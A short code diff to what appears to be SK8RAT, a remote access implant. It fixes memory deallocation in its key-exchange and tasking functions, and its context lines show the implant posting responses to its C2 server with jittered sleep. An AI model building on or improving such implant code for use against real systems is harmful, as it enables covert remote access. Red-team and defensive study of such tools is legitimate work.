@@ -484,11 +484,11 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 	sessioncookie = ssessioncookie;
 
 	// Clean-up dynamically allocated heap
-	delete(ciphertext);
-	delete(sessionkey);
-	delete(ciphertext2);
-	delete(ciphertext_stage2);
-	delete(ciphertext_stage3);
+	delete[] ciphertext;
+	delete[] sessionkey;
+	delete[] ciphertext2;
+	delete[] ciphertext_stage2;
+	delete[] ciphertext_stage3;
 
 	// Sleep then return
 	SleepJitter(sleep, jitter);
@@ -764,8 +764,8 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 	agent_post_cookie(server_ip, server_port, post_uri, sessioncookie, send_response, server_response2);
 
 	// Clean-up dynamically allocated memory
-	delete(server_response);
-	delete(ciphertext_response);
+	delete[] server_response;
+	delete[] ciphertext_response;
 
 	// Sleep then return
 	printf("Sleeping for %i second(s) with %i%% jitter\n\n", sleep, jitter);
